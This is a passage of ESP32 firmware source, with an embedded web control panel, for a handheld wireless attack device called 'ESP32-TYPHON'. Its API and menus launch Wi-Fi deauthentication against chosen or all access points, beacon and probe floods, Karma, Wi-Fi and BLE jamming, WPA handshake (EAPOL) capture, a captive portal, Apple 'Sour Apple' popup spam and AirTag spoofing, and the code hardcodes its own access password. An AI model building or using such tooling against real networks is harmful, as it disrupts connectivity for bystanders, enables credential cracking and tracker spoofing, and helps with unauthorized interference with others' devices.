async function loadWifi(){try{const j=await apiGet('/api/wifi');S.wifi=j.wifi||[];if(typeof renderWifi==='function')renderWifi(S.wifi);if(typeof renderDeauthList==='function')renderDeauthList(S.wifi);if(typeof renderProbeList==='function')renderProbeList(S.wifi);if(typeof renderClientApList==='function')renderClientApList(S.wifi);if(typeof renderFloodList==='function')renderFloodList(S.wifi);}catch(e){}}
async function loadBle(){try{const j=await apiGet('/api/ble');S.ble=j.ble||[];if(j.apple)S.apple=j.apple;if(typeof renderBle==='function')renderBle(S.ble);if(typeof fillSourSelect==='function')fillSourSelect(S.apple);}catch(e){}}
async function loadClients(){try{const j=await apiGet('/api/clients');S.clients=j.clients||[];if(typeof renderClientMacs==='function')renderClientMacs(S.clients);}catch(e){}}
async function loadAir(){try{const j=await apiGet('/api/air');S.airtags=j.airtags||[];if(typeof renderAir==='function')renderAir(S.airtags);if(typeof fillAirTargets==='function')fillAirTargets(S.airtags);}catch(e){}}
async function refreshLists(){const v=document.querySelector('.view.active');const id=v?v.id:'';if(id==='v-wifi-scan'||id==='v-wifi-deauth'||id==='v-wifi-probe'||id==='v-wifi-clients'||id==='v-wifi-flood'||id==='v-wifi')await loadWifi();if(id==='v-ble-scan'||id==='v-ble-sniff'||id==='v-ble-sour'||id==='v-ble')await loadBle();if(id==='v-wifi-clients')await loadClients();if(id==='v-ble-air')await loadAir();}
async function act(action,extra){
  const body=Object.assign({action},extra||{});
  if(action==='pm_start'){body.ch=parseInt(document.getElementById('pmCh').value)||1;body.hop=document.getElementById('pmHop').checked?1:0;}
  if(action==='beacon_start'){
    body.mode=parseInt(document.getElementById('beaconMode').value)||0;
    if(body.mode===2){
      const n=parseInt(document.getElementById('ssidCount').value)||1;
      const arr=[];
      for(let i=0;i<n;i++){const v=(document.getElementById('ssid'+i).value||'').trim(); if(v) arr.push(v);}
      body.list=arr.join('|');
      body.count=arr.length;
    }
  }
  if(action==='deauth_start' && body.target===undefined) body.target=deauthTarget;
  if(action==='probe_start' && body.target===undefined) body.target=probeTarget;
  if(action==='spoof_start'){body.mode=parseInt(document.getElementById('spoofMode').value)||0;body.name=document.getElementById('spoofName').value||'';body.power=parseInt(document.getElementById('spoofPower').value)||9;body.interval=parseInt(document.getElementById('spoofInterval').value)||32;}
  if(action==='sour_start') body.idx=parseInt(document.getElementById('sourIdx').value);
  try{
    const r=await fetch('/api',{method:'POST',headers:{'Content-Type':'application/json','X-TYPHON-KEY':API_KEY},body:JSON.stringify(Object.assign({key:API_KEY},body))});
    const j=await r.json();
    document.getElementById('sysMsg').textContent=j.msg||'';
    await refresh();
    if(typeof refreshLists==='function') await refreshLists();
  }catch(e){document.getElementById('sysMsg').textContent='Request failed — reconnect to ESP32-TYPHON';}
}
function toggle(tool){
  const on={pm:S.pm,beacon:S.beacon,deauth:S.deauth,det:S.det,probe:S.probe,spoof:S.spoof,sour:S.sour,jam:S.jam,air:S.air,sniff:S.sniff}[tool];
  if(tool==='probe'){
    if(on) act('probe_stop');
    else {
      if(probeTarget<0){document.getElementById('sysMsg').textContent='Select an AP from the list first';return;}
      act('probe_start',{target:probeTarget});
    }
    return;
  }
  if(tool==='air'){
    if(on) act('air_stop');
    else {
      const t=parseInt(document.getElementById('airTarget').value);
      act('air_start',{target:isNaN(t)?-1:t});
    }
    return;
  }
  if(on) act(tool+'_stop'); else act(tool+'_start');
}
let airSelected=-1;
function renderAir(list){
  const el=document.getElementById('airList');
  if(!el) return;
  if(!list||!list.length){el.innerHTML='<div class="item"><span>No AirTags yet — start detector</span></div>';return;}
  el.innerHTML=list.map((n,i)=>{
    const act=(airSelected===i)?' active':'';
    return `<div class="item${act}" onclick="pickAir(${i})"><div><b>${esc(n.name||'AirTag')}</b>
      <div class="meta">${esc(n.addr||'')} · ${n.plen||0} B payload</div></div>
      <div class="${rssiClass(n.rssi)}">${n.rssi} dBm</div></div>`;
  }).join('');
}
function pickAir(i){
  airSelected=i;
  const list=S.airtags||[];
  if(list[i]){
    const t=(list[i].name||'AirTag')+' · '+(list[i].addr||'');
    setTargetBar('airDetTargetBar','airSelectedLabel', t, false);
    setTargetBar('airSpoofTargetBar','airSpoofTargetLabel', t, false);
  } else {
    setTargetBar('airDetTargetBar','airSelectedLabel','None — tap a device below', true);
  }
  const sel=document.getElementById('airTarget');
  if(sel){sel.value=String(i); fillAirTargets(list); sel.value=String(i);}
  renderAir(list);
}
function onAirTargetChange(){
  const sel=document.getElementById('airTarget');
  if(!sel) return;
  const v=parseInt(sel.value);
  airSelected=v;
  if(v<0) setTargetBar('airSpoofTargetBar','airSpoofTargetLabel','Spam all / synthetic', false);
  else {
    const list=S.airtags||[];
    if(list[v]) setTargetBar('airSpoofTargetBar','airSpoofTargetLabel',(list[v].name||'AirTag')+' · '+(list[v].addr||''), false);
  }
}
function onSourChange(){
  const sel=document.getElementById('sourIdx');
  if(!sel) return;
  const opt=sel.options[sel.selectedIndex];
  setTargetBar('sourTargetBar','sourTargetLabel', opt?opt.text:'Random Mix', false);
}
function spoofSelectedAir(){
  if(airSelected<0){document.getElementById('sysMsg').textContent='Select an AirTag from the list first';return;}
  act('air_start',{target:airSelected});
  go('ble-air');
}
let airTargetsReady=false, airTargetsSig='';
function fillAirTargets(list){
  const sel=document.getElementById('airTarget'); if(!sel) return;
  const sig=list?(list.length+':'+(list.map(x=>x.addr).join(','))):'0';
  if(sig===airTargetsSig) return;
  airTargetsSig=sig;
  const cur=sel.value;
  sel.innerHTML='<option value="-1">Spam all / synthetic</option>';
  (list||[]).forEach((n,i)=>{const o=document.createElement('option');o.value=i;o.textContent=(n.name||'AirTag')+' '+((n.addr||'').slice(-8));sel.appendChild(o);});
  sel.value=cur;
}
function toggleAirDet(){
  if(S.airDet) act('air_det_stop'); else act('air_det_start');
}

let clientApTarget=-1;
function pickClientAp(i){
  clientApTarget=i;
  const list=S.wifi||[];
  if(list[i]) setTargetBar('clientTargetBar','clientTargetLabel', list[i].ssid+' · CH'+list[i].ch, false);
  else setTargetBar('clientTargetBar','clientTargetLabel','None — tap a network below', true);
  renderClientApList(list);
}
function renderClientApList(list){
  const el=document.getElementById('clientApList');
  if(!el) return;
  if(!list||!list.length){el.innerHTML='<div class="item"><span>Scan Wi‑Fi first</span></div>';return;}
  el.innerHTML=list.map((n,i)=>{
    const act=(clientApTarget===i)?' active':'';
    return `<div class="item${act}" onclick="pickClientAp(${i})"><div><b>${esc(n.ssid)}</b>
      <div class="meta">${esc(n.bssid||'')} · CH ${n.ch}</div></div>
      <div class="${rssiClass(n.rssi)}">${n.rssi} dBm</div></div>`;
  }).join('');
}
function renderClientMacs(list){
  const el=document.getElementById('clientMacList');
  if(!el) return;
  if(!list||!list.length){el.innerHTML='<div class="item"><span>No stations yet</span></div>';return;}
  el.innerHTML=list.map(c=>`<div class="item"><div><b>${esc(c.mac)}</b>
    <div class="meta">last seen ok</div></div>
    <div class="${rssiClass(c.rssi)}">${c.rssi} dBm</div></div>`).join('');
}
function toggleClientSniff(){
  if(S.clientSniff) act('client_sniff_stop');
  else {
    if(clientApTarget<0){document.getElementById('sysMsg').textContent='Select an AP first';return;}
    act('client_sniff_start',{target:clientApTarget});
  }
}


function toggleKarma(){if(S.karma)act('karma_stop');else act('karma_start',{ch:parseInt(document.getElementById('karmaCh').value)||1});}
let floodTarget=-1;
function pickFlood(i){floodTarget=i;const n=(S.wifi||[])[i];if(n)setTargetBar('floodTargetBar','floodTargetLabel',n.ssid+' · CH'+n.ch,false);}
function renderFloodList(list){const el=document.getElementById('floodList');if(!el)return;if(!list||!list.length){el.innerHTML='<div class="item"><span>Scan first</span></div>';return;}
el.innerHTML=list.map((n,i)=>`<div class="item${floodTarget===i?' active':''}" onclick="pickFlood(${i})"><div><b>${esc(n.ssid)}</b><div class="meta">CH ${n.ch}</div></div><div class="${rssiClass(n.rssi)}">${n.rssi}</div></div>`).join('');}
function toggleFlood(){if(S.flood)act('flood_stop');else{if(floodTarget<0){document.getElementById('sysMsg').textContent='Pick AP';return;}act('flood_start',{target:floodTarget,mode:parseInt(document.getElementById('floodMode').value)||0});}}
function toggleEapol(){if(S.eapol)act('eapol_stop');else act('eapol_start',{ch:parseInt(document.getElementById('eapolCh').value)||1});}

setInterval(async()=>{await refresh();if(typeof refreshLists==='function')await refreshLists();},500);
refresh().then(()=>{if(typeof refreshLists==='function')refreshLists();});
</script>
</body></html>
)HTML";


static float readChipTempC() {
  // Internal sensor; approximate, varies by chip/core version
  return temperatureRead();
}

static const char* radioOwnerName() {
  switch (radioOwner) {
    case RADIO_WIFI_SCAN: return "wifi_scan";
    case RADIO_WIFI_TX:   return "wifi_tx";
    case RADIO_BLE_SCAN:  return "ble_scan";
    case RADIO_BLE_ADV:   return "ble_adv";
    default:              return "none";
  }
}

// Wave 3: slim status — counters/flags only (no device lists)
static String jsonStatus() {
  char buf[1536];
  const char* mode = "idle";
  if (wifiScanning || bleScanning || sniffRunning || pmRunning || airDetRunning || clientSniffRunning) mode = "scanning";
  else if (detRunning) mode = "defending";
  else if (beaconRunning || deauthRunning || probeRunning || spoofRunning ||
           sourRunning || jamRunning || airSpoofRunning || karmaRunning || floodRunning) mode = "attacking";
  bool any = pmRunning || beaconRunning || deauthRunning || detRunning ||
             probeRunning || sniffRunning || spoofRunning || sourRunning ||
             jamRunning || airTagRunning || karmaRunning || floodRunning || eapolRunning;

  const char* sn = "-";
  if (sourRunning) {
    if (sourSelected < 0) sn = "Random Mix";
    else if (sourSelected < APPLE_LIST_COUNT) sn = appleList[sourSelected].name;
  }

  snprintf(buf, sizeof(buf),
    "{"
    "\"mode\":\"%s\",\"any\":%s,\"war\":%s,\"webSafe\":%s,\"radio\":\"%s\","
    "\"pm\":%s,\"beacon\":%s,\"deauth\":%s,\"karma\":%s,\"flood\":%s,\"eapol\":%s,"
    "\"clientSniff\":%s,\"det\":%s,\"probe\":%s,\"spoof\":%s,\"sour\":%s,\"jam\":%s,"
    "\"air\":%s,\"airDet\":%s,\"sniff\":%s,"
    "\"wifiScanning\":%s,\"bleScanning\":%s,"
    "\"clientCount\":%d,\"clientSniffAp\":%d,\"airCount\":%d,"
    "\"pmTotal\":%lu,\"pmCh\":%u,\"pmHop\":%s,"
    "\"pmMgmt\":%lu,\"pmData\":%lu,\"pmCtrl\":%lu,\"pmDeauth\":%lu,\"pmRssi\":%d,"
    "\"bleSus\":%lu,\"bleFlood\":%lu,"
    "\"beaconSent\":%lu,\"deauthSent\":%lu,\"detCount\":%lu,\"probeSent\":%lu,"
    "\"jamCount\":%lu,\"airSent\":%lu,\"sourSent\":%lu,"
    "\"karmaSent\":%lu,\"karmaCount\":%d,\"floodSent\":%lu,\"eapolCount\":%d,"
    "\"spoofPower\":%d,\"spoofInterval\":%d,"
    "\"temp\":%.1f,\"heap\":%u,\"heapMin\":%u,\"clients\":%u,"
    "\"sourName\":\"%s\""
    "}",
    mode,
    any ? "true" : "false",
    warMode ? "true" : "false",
    webSafeActive() ? "true" : "false",
    radioOwnerName(),
    pmRunning ? "true" : "false",
    beaconRunning ? "true" : "false",
    deauthRunning ? "true" : "false",
    karmaRunning ? "true" : "false",
    floodRunning ? "true" : "false",
    eapolRunning ? "true" : "false",
    clientSniffRunning ? "true" : "false",
    detRunning ? "true" : "false",
    probeRunning ? "true" : "false",
    spoofRunning ? "true" : "false",
    sourRunning ? "true" : "false",
    jamRunning ? "true" : "false",
    airSpoofRunning ? "true" : "false",
    airDetRunning ? "true" : "false",
    sniffRunning ? "true" : "false",
    wifiScanning ? "true" : "false",
    bleScanning ? "true" : "false",
    clientCount,
    clientSniffAp,
    airTagCount,
    (unsigned long)pktTotal, (unsigned)pmChannel, pmHop ? "true" : "false",
    (unsigned long)pmMgmt, (unsigned long)pmData, (unsigned long)pmCtrl,
    (unsigned long)pmDeauthSeen, (int)pmLastRssi,
    (unsigned long)bleSuspicious, (unsigned long)bleFloodAlerts,
    (unsigned long)beaconSent, (unsigned long)deauthSent,
    (unsigned long)deauthCount, (unsigned long)probeSent,
    (unsigned long)jamCount, (unsigned long)airTagSent, (unsigned long)sourSent,
    (unsigned long)karmaSent, karmaCount, (unsigned long)floodSent, (int)eapolCount,
    spoofPower, spoofInterval,
    (double)readChipTempC(),
    (unsigned)ESP.getFreeHeap(),
    (unsigned)ESP.getMinFreeHeap(),
    (unsigned)WiFi.softAPgetStationNum(),
    sn
  );
  return String(buf);
}

static String jsonWifiList() {
  String j = "{\"wifi\":[";
  for (int i = 0; i < wifiCount; i++) {
    if (i) j += ",";
    String s = wifiNets[i].ssid; s.replace("\"", "'");
    char bssid[18];
    snprintf(bssid, sizeof(bssid), "%02X:%02X:%02X:%02X:%02X:%02X",
             wifiNets[i].bssid[0], wifiNets[i].bssid[1], wifiNets[i].bssid[2],
             wifiNets[i].bssid[3], wifiNets[i].bssid[4], wifiNets[i].bssid[5]);
    const char* encStr = "Open";
    switch (wifiNets[i].enc) {
      case WIFI_AUTH_OPEN: encStr = "Open"; break;
      case WIFI_AUTH_WEP: encStr = "WEP"; break;
      case WIFI_AUTH_WPA_PSK: encStr = "WPA"; break;
      case WIFI_AUTH_WPA2_PSK: encStr = "WPA2"; break;
      case WIFI_AUTH_WPA_WPA2_PSK: encStr = "WPA/WPA2"; break;
      case WIFI_AUTH_WPA2_ENTERPRISE: encStr = "Enterprise"; break;
      case WIFI_AUTH_WPA3_PSK: encStr = "WPA3"; break;
      case WIFI_AUTH_WPA2_WPA3_PSK: encStr = "WPA2/WPA3"; break;
      default: encStr = "Other"; break;
    }
    j += "{\"ssid\":\"" + s + "\",\"bssid\":\"" + String(bssid) +
         "\",\"rssi\":" + String(wifiNets[i].rssi) +
         ",\"ch\":" + String(wifiNets[i].ch) +
         ",\"enc\":\"" + String(encStr) +
         "\",\"open\":" + String(wifiNets[i].enc == WIFI_AUTH_OPEN ? "true" : "false") + "}";
  }
  j += "]}";
  return j;
}

static String jsonBleList() {
  String j = "{\"ble\":[";
  for (int i = 0; i < bleCount; i++) {
    if (i) j += ",";
    String n = bleDevs[i].name; n.replace("\"", "'");
    String a = bleDevs[i].addr; a.replace("\"", "'");
    j += "{\"name\":\"" + n + "\",\"addr\":\"" + a + "\",\"rssi\":" + String(bleDevs[i].rssi) +
         ",\"hits\":" + String((unsigned long)bleDevs[i].hits) +
         ",\"sus\":" + String(bleDevs[i].suspicious ? "true" : "false") +
         ",\"rand\":" + String(bleDevs[i].randomized ? "true" : "false") + "}";
  }
  j += "],\"apple\":[";
  for (int i = 0; i < APPLE_LIST_COUNT; i++) {
    if (i) j += ",";
    String n = appleList[i].name; n.replace("\"", "'");
    j += "\"" + n + "\"";
  }
  j += "]}";
  return j;
}

static String jsonClientsList() {
  String j = "{\"clients\":[";
  for (int i = 0; i < clientCount; i++) {
    if (i) j += ",";
    char macs[18];
    snprintf(macs, sizeof(macs), "%02X:%02X:%02X:%02X:%02X:%02X",
             clients[i].mac[0], clients[i].mac[1], clients[i].mac[2],
             clients[i].mac[3], clients[i].mac[4], clients[i].mac[5]);
    j += "{\"mac\":\"" + String(macs) + "\",\"rssi\":" + String((int)clients[i].rssi) + "}";
  }
  j += "]}";
  return j;
}

static String jsonAirList() {
  String j = "{\"airtags\":[";
  for (int i = 0; i < airTagCount; i++) {
    if (i) j += ",";
    String nm = airTags[i].name; nm.replace("\"", "'");
    String ad = airTags[i].addr; ad.replace("\"", "'");
    j += "{\"name\":\"" + nm + "\",\"addr\":\"" + ad +
         "\",\"rssi\":" + String((int)airTags[i].rssi) +
         ",\"plen\":" + String(airTags[i].payloadLen) + "}";
  }
  j += "]}";
  return j;
}


// Web control-plane auth: must match Soft-AP password (not internet-grade, stops casual API abuse on the AP)
static const char* WEB_API_KEY = "rgisking";

static bool webApiAuthorized() {
  // Prefer header (fetch can set it)
  if (webServer.hasHeader("X-TYPHON-KEY")) {
    String h = webServer.header("X-TYPHON-KEY");
    if (h.equals(WEB_API_KEY)) return true;
  }
  // Fallback: JSON body "key"
  String body = webServer.arg("plain");
  if (body.indexOf("\"key\":\"rgisking\"") >= 0 || body.indexOf("\"key\": \"rgisking\"") >= 0)
    return true;
  // Query string for simple GET status: ?key=rgisking
  if (webServer.hasArg("key") && webServer.arg("key") == WEB_API_KEY)
    return true;
  return false;
}

static void webSendUnauthorized() {
  webServer.send(401, "application/json", "{\"error\":\"unauthorized\",\"msg\":\"Provide X-TYPHON-KEY or key=rgisking\"}");
}

static void handleWebRoot() { webServer.send_P(200, "text/html", WEB_PAGE); }
static void handleWebStatus() {
  if (!webApiAuthorized()) { webSendUnauthorized(); return; }
  webServer.send(200, "application/json", jsonStatus());
}
static void handleWebWifi() {
  if (!webApiAuthorized()) { webSendUnauthorized(); return; }
  webServer.send(200, "application/json", jsonWifiList());
}
static void handleWebBle() {
  if (!webApiAuthorized()) { webSendUnauthorized(); return; }
  webServer.send(200, "application/json", jsonBleList());
}
static void handleWebClientsList() {
  if (!webApiAuthorized()) { webSendUnauthorized(); return; }
  webServer.send(200, "application/json", jsonClientsList());
}
static void handleWebAir() {
  if (!webApiAuthorized()) { webSendUnauthorized(); return; }
  webServer.send(200, "application/json", jsonAirList());
}

static void handleWebApi() {
  if (!webApiAuthorized()) { webSendUnauthorized(); return; }
  String body = webServer.arg("plain");
  String action;
  int mode = 0, target = -1, ch = 1, idx = -1;
  String customName;

  int ai = body.indexOf("\"action\"");
  if (ai >= 0) {
    int q1 = body.indexOf('"', ai + 8);
    int q2 = body.indexOf('"', q1 + 1);
    if (q1 >= 0 && q2 > q1) action = body.substring(q1 + 1, q2);
  }
  auto parseIntAfter = [&](const char* key, int defv) -> int {
    int k = body.indexOf(key);
    if (k < 0) return defv;
    int c = k + (int)strlen(key);
    while (c < (int)body.length() && (body[c] < '0' || body[c] > '9') && body[c] != '-') c++;
    return (int)body.substring(c).toInt();
  };
  mode = parseIntAfter("\"mode\"", 0);
  target = parseIntAfter("\"target\"", -1);
  ch = parseIntAfter("\"ch\"", 1);
  idx = parseIntAfter("\"idx\"", -1);
  if (ch < 1 || ch > 13) ch = 1;
  {
    int ni = body.indexOf("\"name\"");
    if (ni >= 0) {
      int q1 = body.indexOf('"', ni + 6);
      int q2 = body.indexOf('"', q1 + 1);
      if (q1 >= 0 && q2 > q1) customName = body.substring(q1 + 1, q2);
    }
  }

  String msg = "OK";
  if (action == "stop_all") { stopAllTools(); msg = "All tools stopped"; }
  else if (action == "exit_web") { webExitRequested = true; msg = "Exiting web mode"; }
  else if (action == "wifi_scan") {
    if (webMode) {
      WiFi.mode(WIFI_AP_STA);
      WiFi.softAP("ESP32-TYPHON", "rgisking");
  radioSettleRequest(25);
    }
    wifiScanStart();
    msg = wifiScanning ? "Wi-Fi scan started" : "Scan failed to start";
  }
  else if (action == "pm_start") { stopAllTools(); pmChannel = ch; pmHop = (body.indexOf("\"hop\":1") >= 0 || body.indexOf("\"hop\": 1") >= 0); pmStart(); msg = String("Packet monitor CH") + String(ch) + (pmHop ? " (hop)" : ""); }
  else if (action == "pm_stop") { pmStop(); msg = "PM stopped"; }
  else if (action == "beacon_start") {
    stopAllTools();
    beaconMode = (uint8_t)mode;
    if (beaconMode == 2) {
      customBeaconCount = 0;
      customBeaconIdx = 0;
      int li = body.indexOf("\"list\"");
      String listStr;
      if (li >= 0) {
        int q1 = body.indexOf('"', li + 6);
        int q2 = body.indexOf('"', q1 + 1);
        if (q1 >= 0 && q2 > q1) listStr = body.substring(q1 + 1, q2);
      }
      int start = 0;
      while (start < (int)listStr.length() && customBeaconCount < 10) {
        int pipe = listStr.indexOf('|', start);
        String part = (pipe < 0) ? listStr.substring(start) : listStr.substring(start, pipe);
        part.trim();
        if (part.length() > 0) {
          if (part.length() > 32) part = part.substring(0, 32);
          strncpy(customBeaconSSIDs[customBeaconCount], part.c_str(), 32);
          customBeaconSSIDs[customBeaconCount][32] = 0;
          customBeaconCount++;
        }
        if (pipe < 0) break;
        start = pipe + 1;
      }
      if (customBeaconCount == 0) {
        msg = "Add at least one SSID";
        webServer.send(200, "application/json",
          String("{\"msg\":\"") + msg + "\"}");
        return;
      }
    }
    beaconStart();
    msg = "Beacon started";
  }
  else if (action == "beacon_stop") { beaconStop(); msg = "Beacon stopped"; }
  else if (action == "client_sniff_start") {
    stopAllTools();
    if (target < 0 || target >= wifiCount) msg = "Select AP first";
    else if (webSafeActive()) msg = "Web-safe: client sniff disabled (use handheld)";
    else { clientSniffStart(target); msg = String("Sniffing clients on ") + wifiNets[target].ssid; }
  }
  else if (action == "client_sniff_stop") { clientSniffStop(); msg = "Client sniff stopped"; }
  else if (action == "deauth_start") {
    stopAllTools();
    if (target < 0) deauthStartAll();
    else deauthStart(target);
    msg = webSafeActive()
      ? "Deauth on CH1 only (web-safe; off-channel APs unaffected)"
      : "Deauth started";
  }
  else if (action == "deauth_stop") { deauthStop(); msg = "Deauth stopped"; }
  else if (action == "det_start") { stopAllTools(); detStart(); msg = "Detector started"; }
  else if (action == "det_stop") { detStop(); msg = "Detector stopped"; }
  else if (action == "probe_start") {
    stopAllTools();
    if (target < 0 || target >= wifiCount) {
      msg = "Select a Wi-Fi target first (scan + tap)";
    } else {
      probeStart(target);
      msg = String("Probe stress on ") + wifiNets[target].ssid;
    }
  }
  else if (action == "probe_stop") { probeStop(); msg = "Probe stopped"; }
  else if (action == "ble_scan") {
    sniffStop(); spoofStop(); sourStop(); jamStop(); airTagStop();
    bleScanStart();
    msg = "BLE scan started (4s)";
  }
  else if (action == "sniff_start") { spoofStop(); sourStop(); jamStop(); airTagStop(); sniffStart(); msg = "Sniff started"; }
  else if (action == "sniff_stop") { sniffStop(); msg = "Sniff stopped"; }
  else if (action == "spoof_start") {
    sniffStop(); sourStop(); jamStop(); airTagStop();
    spoofMode = (uint8_t)mode;
    if (customName.length()) spoofCustomName = customName;
    {
      int p = body.indexOf("\"power\"");
      if (p >= 0) {
        int c = body.indexOf(':', p);
        if (c > 0) spoofPower = (uint8_t)constrain(body.substring(c + 1).toInt(), 0, 9);
      }
      int iv = body.indexOf("\"interval\"");
      if (iv >= 0) {
        int c = body.indexOf(':', iv);
        if (c > 0) spoofInterval = (uint16_t)constrain(body.substring(c + 1).toInt(), 16, 160);
      }
    }
    spoofStart();
    msg = "Spoofer started";
  }
  else if (action == "spoof_stop") { spoofStop(); msg = "Spoofer stopped"; }
  else if (action == "sour_start") {
    sniffStop(); spoofStop(); jamStop(); airTagStop();
    sourSelected = idx;  // -1 = random
    sourStart();
    sourBeginAdvertise();
    msg = "Sour Apple started";
  }
  else if (action == "sour_stop") { sourStop(); msg = "Sour Apple stopped"; }
  else if (action == "jam_start") { sniffStop(); spoofStop(); sourStop(); airTagStop(); jamStart(); msg = "Jammer started"; }
  else if (action == "jam_stop") { jamStop(); msg = "Jammer stopped"; }
  else if (action == "air_det_start") {
    sniffStop(); spoofStop(); sourStop(); jamStop(); airSpoofStop();
    airDetStart();
    msg = "AirTag detector started";
  }
  else if (action == "air_det_stop") { airDetStop(); msg = "AirTag detector stopped"; }
  else if (action == "air_start") {
    sniffStop(); spoofStop(); sourStop(); jamStop(); airDetStop();
    int atarget = -1;
    int tp = body.indexOf("\"target\"");
    if (tp >= 0) {
      int c = body.indexOf(':', tp);
      if (c > 0) atarget = body.substring(c + 1).toInt();
    }
    if (airTagCount == 0) airTagBeginSpoof();
    else airSpoofStart(atarget);
    msg = "AirTag spoof started";
  }
  else if (action == "air_stop") { airTagStop(); msg = "AirTag stopped"; }
  else msg = "Unknown action";

  webServer.send(200, "application/json",
    String("{\"msg\":\"") + msg + "\"}");
}


static void drawWebModeScreen() {
  tft.fillScreen(COL_BG);
  Theme::drawStatusBar("WEB MODE");
  Theme::printCentered("Soft-AP active", 28, COL_OK, 1);
  Theme::printCentered("SSID: ESP32-TYPHON", 48, COL_FG, 1);
  Theme::printCentered("Pass: rgisking", 64, COL_FG, 1);
  Theme::printCentered("http://192.168.4.1", 84, COL_ACCENT, 1);
  Theme::drawFooter("LED ON", "Hold BOOT=Exit");
}

static void setupWebRoutes() {
  webServer.stop();
  webServer.on("/", HTTP_GET, handleWebRoot);
  webServer.on("/api/status", HTTP_GET, handleWebStatus);
  webServer.on("/api/wifi", HTTP_GET, handleWebWifi);
  webServer.on("/api/ble", HTTP_GET, handleWebBle);
  webServer.on("/api/clients", HTTP_GET, handleWebClientsList);
  webServer.on("/api/air", HTTP_GET, handleWebAir);
  webServer.on("/api", HTTP_POST, handleWebApi);
  webServer.onNotFound(handleWebRoot);
  webServer.begin();
}

static void enterWebMode() {
  if (webMode) return;
  stopAllTools();
  webMode = true;
  webExitRequested = false;
  digitalWrite(STATUS_LED, HIGH);
  WiFi.mode(WIFI_AP);
  WiFi.softAP("ESP32-TYPHON", "rgisking");
  radioSettleRequest(25);
  setupWebRoutes();
  drawWebModeScreen();
  Serial.println("[WEB] Soft-AP ESP32-TYPHON / rgisking -> http://192.168.4.1");
}

static void exitWebMode() {
  if (!webMode) return;
  stopAllTools();
  webServer.stop();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_STA);
  digitalWrite(STATUS_LED, LOW);
  webMode = false;
  webExitRequested = false;
  bootHoldStart = 0;
  bootWasDown = false;
  Serial.println("[WEB] Exited Soft-AP mode");
}

static void handleWebClients() {
  if (!webMode) return;
  // Pump several times so attacks with tight loops do not starve HTTP
  for (int i = 0; i < 4; i++) webServer.handleClient();
  if (webExitRequested) exitWebMode();
}


// ============================================================
//  UI
// ============================================================


UI ui;

const char* const UI::MAIN_ITEMS[] = {
  "Wi-Fi Tools", "Bluetooth Tools", "Stop All Tools", "About"
};
const int UI::MAIN_COUNT = 4;

const char* const UI::WIFI_ITEMS[] = {
  "Wi-Fi Scanner", "Packet Monitor", "Beacon Spammer",
  "Deauth Attack", "Client Sniffer", "Deauth Detector",
  "Probe Flood", "Karma", "WiFi Jammer", "EAPOL Capture",
  "Captive Portal", "War Mode", "Back"
};
const int UI::WIFI_COUNT = 13;

const char* const UI::BLE_ITEMS[] = {
  "BLE Scanner", "BLE Sniffer", "BLE Spoofer", "Sour Apple",
  "BLE Jammer", "AirTag Tools", "Back"
};
const int UI::BLE_COUNT = 7;

void UI::begin() {
  setCpuFrequencyMhz(240);
  dualCoreStart();
  typhoonMaxWifiTx();
  SPIFFS.begin(true);

  pinMode(BOOT_BTN, INPUT_PULLUP);
  pinMode(STATUS_LED, OUTPUT);
  digitalWrite(STATUS_LED, LOW);

  Theme::init();
  joystick.begin();
  wifiScanBegin();
  _screen = SCR_MAIN;
  _sel = 0; _top = 0; _dirty = true;
  drawCurrent();
}

void UI::enterScreen(Screen s) {
  pmStop(); beaconStop(); detStop(); deauthStop(); clientSniffStop(); probeStop();
  karmaStop(); floodStop(); eapolStop(); captiveStop();
  sniffStop(); spoofStop(); sourStop(); jamStop(); airTagStop();

  _screen = s;
  _sel = 0; _top = 0; _dirty = true;

  if (s == SCR_WIFI_SCAN)  { wifiScanDetail = false; wifiScanStart(); }
  if (s == SCR_BLE_SCAN)   bleScanStart();
  if (s == SCR_PACKET_MON) pmStart();
  if (s == SCR_BEACON)     { beaconStop(); }
  if (s == SCR_DEAUTH_DET) detStart();
  if (s == SCR_PROBE)      { probeStop(); }
  if (s == SCR_KARMA)      { karmaStop(); }
  if (s == SCR_FLOOD)      { floodStop(); }
  if (s == SCR_EAPOL)      { eapolStop(); }
  if (s == SCR_WAR)        { /* toggle screen */ }
  if (s == SCR_CAPTIVE)    captiveStart();
  if (s == SCR_BLE_SNIFF)  sniffStart();
  if (s == SCR_BLE_SPOOF)  { spoofStop(); }
  if (s == SCR_SOUR_APPLE) {
    sourStart();
    _sel = (sourSelected < 0) ? 0 : (sourSelected + 1);
    if (_sel >= 6) _top = _sel - 5;
  }
  if (s == SCR_BLE_JAM)    { jamStop(); }
  if (s == SCR_AIRTAG)     { airTagStart(); airMenuSel = 0; }
}

void UI::goBack() {
  wifiScanDetail = false;
  pmStop(); beaconStop(); detStop(); deauthStop(); clientSniffStop(); probeStop(); captiveStop();
  sniffStop(); spoofStop(); sourStop(); jamStop(); airTagStop();

  switch (_screen) {
    case SCR_WIFI_MENU: case SCR_BLE_MENU: case SCR_ABOUT:
      enterScreen(SCR_MAIN); break;
    case SCR_WIFI_SCAN: case SCR_PACKET_MON: case SCR_BEACON:
    case SCR_DEAUTH: case SCR_CLIENT_SNIFF: case SCR_DEAUTH_DET: case SCR_PROBE:
    case SCR_KARMA: case SCR_FLOOD: case SCR_EAPOL: case SCR_WAR: case SCR_CAPTIVE:
      enterScreen(SCR_WIFI_MENU); break;
    case SCR_BLE_SCAN: case SCR_BLE_SNIFF: case SCR_BLE_SPOOF:
    case SCR_SOUR_APPLE: case SCR_BLE_JAM: case SCR_AIRTAG:
      enterScreen(SCR_BLE_MENU); break;
    default:
      enterScreen(SCR_MAIN); break;
  }
}

void UI::handleInput(JoyAction a) {
  if (a == JOY_NONE) return;

  // WiFi Scanner: short=details, 1s hold=refresh, 2s hold=back
  if (_screen == SCR_WIFI_SCAN) {
    if (wifiScanDetail) {
      if (a == JOY_BACK || a == JOY_BACK2 || a == JOY_SELECT) {
        wifiScanDetail = false;
        _dirty = true;
      }
      return;
    }
    int cnt = wifiCount;
    if (cnt > 0 && _sel >= cnt) { _sel = cnt - 1; menuEnsureVisible(_sel, _top, cnt, 6); }
    if (a == JOY_UP || a == JOY_HOLD_UP) {
      if (_sel > 0) { _sel--; menuEnsureVisible(_sel, _top, cnt, 6); _dirty = true; }
    } else if (a == JOY_DOWN || a == JOY_HOLD_DOWN) {
      if (cnt > 0 && _sel < cnt - 1) { _sel++; menuEnsureVisible(_sel, _top, cnt, 6); _dirty = true; }
    } else if (a == JOY_SELECT) {
      // Open detail for selected network (do not refresh)
